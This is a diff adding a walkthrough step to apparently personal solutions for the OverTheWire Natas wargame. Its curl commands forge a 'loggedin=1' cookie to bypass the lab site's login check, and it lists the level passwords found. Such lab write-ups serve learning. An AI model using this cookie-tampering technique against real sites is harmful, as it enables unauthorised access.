@@ -60,3 +60,16 @@ Don't be sly! Try to solve the challenges on your own before comparing with my s
 	- password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
 ## natas 5 -> 6
+ - Generate the base64 token and save it to a variable:
+	- `generate_token=$(echo -ne "natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" | base64 --wrap 0)`
+ - Try the following curl:
+	- `curl -H "Authorization: Basic $generate_token" http://natas5.natas.labs.overthewire.org`
+ - Display headers adding `-I`:
+	- `curl -H "Authorization: Basic $generate_token" -I http://natas5.natas.labs.overthewire.org`
+ - As you can see, there's a header loggedin=0. Try setting it to 1 in the curl:
+	- `curl -H "Authorization: Basic $generate_token" -H "Cookie: loggedin=1" http://natas5.natas.labs.overthewire.org`
+ - Visit the link: http://natas6.natas.labs.overthewire.org
+	- username: natas6
+	- password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+## natas 6 -> 7
